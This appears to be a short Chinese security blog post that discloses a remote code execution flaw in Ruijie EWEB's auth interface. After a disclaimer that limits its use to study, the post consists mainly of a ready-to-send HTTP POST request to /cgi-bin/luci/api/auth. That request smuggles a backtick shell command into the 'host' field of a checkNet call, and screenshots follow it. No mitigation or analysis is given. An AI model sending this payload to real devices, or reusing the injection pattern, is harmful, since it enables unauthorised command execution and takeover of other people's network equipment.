#  锐捷 EWEB auth 远程代码执行漏洞   
 HK安全小屋   2025-03-29 13:15  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0ttM5lbOibia3icjVq89tJOJvasbvEtcDvpvbql2ibwmJlezdGajUo31aseBNWqxNz3SLWMjHz3bu6Ng/640?wx_fmt=png&from=appmsg "")  
```
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: 192.168.131.88
Content-Type: application/jsonContent-Length: 56

{"method":"checkNet","params":{"host":"`id >test.txt`"}}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0ttM5lbOibia3icjVq89tJOJvNIFicvOPo3FU9eg8lbo7YkcShJPtbGMag9bSTmIRhYx8f3MXNXhlS3Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0ttM5lbOibia3icjVq89tJOJv42S1uN73TL0m1v5FtSyxIjIzsibsibicicDuXa2HoCiak0w8UrkrQ03lllA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
